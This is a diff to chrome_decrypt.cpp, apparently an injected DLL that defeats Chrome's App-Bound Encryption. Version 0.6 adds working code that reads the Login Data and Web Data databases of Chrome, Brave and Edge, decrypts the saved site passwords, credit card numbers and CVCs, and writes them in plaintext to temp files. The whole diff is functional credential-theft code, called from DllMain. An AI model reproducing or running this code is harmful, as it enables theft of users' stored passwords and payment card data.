@@ -1,5 +1,5 @@
 // chrome_decrypt.cpp
-// v0.5 (c) Alexander 'xaitax' Hagenah
+// v0.6 (c) Alexander 'xaitax' Hagenah
 /*
  * Chrome App-Bound Encryption Service:
  * https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
@@ -19,6 +19,7 @@
 #include <algorithm>
 #include <tlhelp32.h>
 #include <bcrypt.h>
+#include <unordered_map>
 typedef LONG NTSTATUS;
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
@@ -91,6 +92,8 @@ namespace ChromeAppBound
         std::string executablePath;
         std::string localStatePath;
         std::string cookiePath;
+        std::string loginDataPath;
+        std::string webDataPath;
         std::string name;
     };
 
@@ -104,6 +107,8 @@ namespace ChromeAppBound
                 "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                 "\\Google\\Chrome\\User Data\\Local State",
                 "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+                "\\Google\\Chrome\\User Data\\Default\\Login Data",
+                "\\Google\\Chrome\\User Data\\Default\\Web Data",
                 "Chrome"};
         }
         else if (browserType == "brave")
@@ -114,6 +119,8 @@ namespace ChromeAppBound
                 "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                 "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                 "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
+                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data",
                 "Brave"};
         }
         else if (browserType == "edge")
@@ -127,6 +134,8 @@ namespace ChromeAppBound
                 "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                 "\\Microsoft\\Edge\\User Data\\Local State",
                 "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
+                "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+                "\\Microsoft\\Edge\\User Data\\Default\\Web Data",
                 "Edge"};
         }
         throw std::invalid_argument("Unsupported browser type");
@@ -431,6 +440,236 @@ namespace ChromeAppBound
 
         Logging::Log("[*] " + std::to_string(count) + " Cookies extracted to " + outPath);
     }
+
+    static std::string GetPasswordsOutputPath(const std::string &browserName)
+    {
+        char tmp[MAX_PATH];
+        if (!GetTempPathA(MAX_PATH, tmp))
+            return "";
+        return std::string(tmp) + browserName + "_decrypt_passwords.txt";
+    }
+
+    void DecryptPasswords(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
+    {
+        std::string db = GetAppDataPath() + cfg.loginDataPath;
+        sqlite3 *conn = nullptr;
+        if (sqlite3_open_v2(db.c_str(), &conn, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK)
+        {
+            Logging::Log("[-] sqlite3_open_v2 failed (Login Data): " + std::string(sqlite3_errmsg(conn)));
+            return;
+        }
+
+        sqlite3_stmt *stmt = nullptr;
+        int rc = sqlite3_prepare_v2(conn,
+                                    "SELECT origin_url, username_value, password_value FROM logins;",
+                                    -1, &stmt, nullptr);
+        if (rc != SQLITE_OK)
+        {
+            Logging::Log("[-] sqlite3_prepare_v2 failed (Login Data): " + std::string(sqlite3_errmsg(conn)));
+            sqlite3_close(conn);
+            return;
+        }
+
+        std::string outPath = GetPasswordsOutputPath(cfg.name);
+        std::ofstream out(outPath, std::ios::trunc);
+        if (!out)
+        {
+            Logging::Log("[-] Could not open passwords output file: " + outPath);
+            sqlite3_finalize(stmt);
+            sqlite3_close(conn);
+            return;
+        }
+
+        out << "[\n";
+        bool first = true;
+        int count = 0;
+        while (sqlite3_step(stmt) == SQLITE_ROW)
+        {
+            const char *origin = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
+            const char *user = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));
+            const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
+            int len = sqlite3_column_bytes(stmt, 2);
+
+            if (len > 3 && blob[0] == 'v' && blob[1] == '2' && blob[2] == '0')
+            {
+                const uint8_t *iv = blob + 3;
+                ULONG ivLen = 12;
+                const uint8_t *tag = blob + len - 16;
+                ULONG tagLen = 16;
+                ULONG ctLen = len - 3 - ivLen - tagLen;
+                const uint8_t *ct = blob + 3 + ivLen;
+
+                auto plain = DecryptGcm(aesKey, iv, ivLen, ct, ctLen, tag, tagLen);
+
+                if (!plain.empty())
+                {
+                    std::string pwd(reinterpret_cast<const char *>(plain.data()), plain.size());
+                    if (!first)
+                        out << ",\n";
+                    first = false;
+                    out << "  {"
+                        << "\"origin\":\"" << escapeJson(origin) << "\","
+                        << "\"username\":\"" << escapeJson(user) << "\","
+                        << "\"password\":\"" << escapeJson(pwd) << "\""
+                        << "}";
+                    ++count;
+                }
+                else
+                {
+                    Logging::Log("[-]   DecryptGcm returned empty plaintext");
+                }
+            }
+            else
+            {
+                Logging::Log("[-] Skipped entry: not v20 or too small.");
+            }
+        }
+
+        out << "\n]\n";
+        out.close();
+        sqlite3_finalize(stmt);
+        sqlite3_close(conn);
+
+        Logging::Log("[*] " + std::to_string(count) + " Passwords extracted to " + outPath);
+    }
+
+    static std::string GetPaymentsOutputPath(const std::string &browserName)
+    {
+        char tmp[MAX_PATH];
+        if (GetTempPathA(MAX_PATH, tmp) == 0)
+            return "";
+        return std::string(tmp) + browserName + "_decrypt_payments.txt";
+    }
+
+    void DecryptPaymentMethods(const std::vector<uint8_t> &aesKey, const BrowserConfig &cfg)
+    {
+        std::string filePath = GetAppDataPath() + cfg.webDataPath;
+        std::string uri = "file:" + filePath + "?mode=ro&nolock=1";
+
+        sqlite3 *conn = nullptr;
+        if (sqlite3_open_v2(
+                uri.c_str(), &conn,
+                SQLITE_OPEN_READONLY | SQLITE_OPEN_URI,
+                nullptr) != SQLITE_OK)
+        {
+            Logging::Log("[-] sqlite3_open_v2 failed (Web Data nolock): " + std::string(sqlite3_errmsg(conn)));
+            return;
+        }
+
+        std::unordered_map<std::string, std::vector<uint8_t>> cvcMap;
+        {
+            sqlite3_stmt *st = nullptr;
+            if (sqlite3_prepare_v2(conn,
+                                   "SELECT guid, value_encrypted FROM local_stored_cvc;",
+                                   -1, &st, nullptr) == SQLITE_OK)
+            {
+                while (sqlite3_step(st) == SQLITE_ROW)
+                {
+                    const char *guid = reinterpret_cast<const char *>(sqlite3_column_text(st, 0));
+                    const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(st, 1));
+                    int len = sqlite3_column_bytes(st, 1);
+                    cvcMap[guid] = std::vector<uint8_t>(blob, blob + len);
+                }
+            }
+            else
+            {
+                Logging::Log("[-] sqlite3_prepare_v2 failed (local_stored_cvc): " + std::string(sqlite3_errmsg(conn)));
+            }
+            sqlite3_finalize(st);
+        }
+
+        sqlite3_stmt *stmt = nullptr;
+        if (sqlite3_prepare_v2(conn,
+                               "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted "
+                               "FROM credit_cards;",
+                               -1, &stmt, nullptr) != SQLITE_OK)
+        {
+            Logging::Log("[-] sqlite3_prepare_v2 failed (credit_cards): " + std::string(sqlite3_errmsg(conn)));
+            sqlite3_close(conn);
+            return;
+        }
+
+        std::string outPath = GetPaymentsOutputPath(cfg.name);
+        std::ofstream out(outPath, std::ios::trunc);
+        if (!out)
+        {
+            Logging::Log("[-] Could not open payments output file: " + outPath);
+            sqlite3_finalize(stmt);
+            sqlite3_close(conn);
+            return;
+        }
+        out << "[\n";
+
+        bool first = true;
+        int totalRows = 0;
+        int extracted = 0;
+
+        while (sqlite3_step(stmt) == SQLITE_ROW)
+        {
+            totalRows++;
+            const char *guid = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 0));
+            const char *name = reinterpret_cast<const char *>(sqlite3_column_text(stmt, 1));
+            int month = sqlite3_column_int(stmt, 2);
+            int year = sqlite3_column_int(stmt, 3);
+            const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 4));
+            int len = sqlite3_column_bytes(stmt, 4);
+
+            if (len <= 3 || blob[0] != 'v' || blob[1] != '2' || blob[2] != '0')
+                continue;
+
+            const uint8_t *iv = blob + 3;
+            ULONG ivLen = 12;
+            const uint8_t *tag = blob + len - 16;
+            ULONG tagLen = 16;
+            ULONG ctLen = len - 3 - ivLen - tagLen;
+            const uint8_t *ct = blob + 3 + ivLen;
+
+            auto plainNum = DecryptGcm(aesKey, iv, ivLen, ct, ctLen, tag, tagLen);
+            std::string cardNumber;
+            if (!plainNum.empty())
+                cardNumber.assign(reinterpret_cast<const char *>(plainNum.data()), plainNum.size());
+
+            std::string cvcValue;
+            auto it = cvcMap.find(guid);
+            if (it != cvcMap.end())
+            {
+                auto &cvcBlob = it->second;
+                if (cvcBlob.size() > 3 && cvcBlob[0] == 'v' && cvcBlob[1] == '2' && cvcBlob[2] == '0')
+                {
+                    const uint8_t *iv2 = cvcBlob.data() + 3;
+                    ULONG iv2Len = 12;
+                    const uint8_t *tag2 = cvcBlob.data() + cvcBlob.size() - 16;
+                    ULONG tag2Len = 16;
+                    ULONG ct2Len = cvcBlob.size() - 3 - iv2Len - tag2Len;
+                    const uint8_t *ct2 = cvcBlob.data() + 3 + iv2Len;
+                    auto plainCvc = DecryptGcm(aesKey, iv2, iv2Len, ct2, ct2Len, tag2, tag2Len);
+                    if (!plainCvc.empty())
+                        cvcValue.assign(reinterpret_cast<const char *>(plainCvc.data()), plainCvc.size());
+                }
+            }
+
+            if (!first)
+                out << ",\n";
+            first = false;
+            out << "  {"
+                << "\"name_on_card\":\"" << escapeJson(name) << "\","
+                << "\"expiration_month\":" << month << ","
+                << "\"expiration_year\":" << year << ","
+                << "\"card_number\":\"" << escapeJson(cardNumber) << "\","
+                << "\"cvc\":\"" << escapeJson(cvcValue) << "\""
+                << "}";
+            extracted++;
+        }
+
+        out << "\n]\n";
+        out.close();
+
+        sqlite3_finalize(stmt);
+        sqlite3_close(conn);
+
+        Logging::Log("[*] " + std::to_string(extracted) + " payment methods extracted to " + outPath);
+    }
+
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
@@ -527,6 +766,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
 
                     std::vector<uint8_t> aesKey(keyBytes, keyBytes + ChromeAppBound::KeySize);
                     ChromeAppBound::DecryptCookies(aesKey, cfg);
+                    ChromeAppBound::DecryptPasswords(aesKey, cfg);
+                    ChromeAppBound::DecryptPaymentMethods(aesKey, cfg);
                 }
                 else
                 {
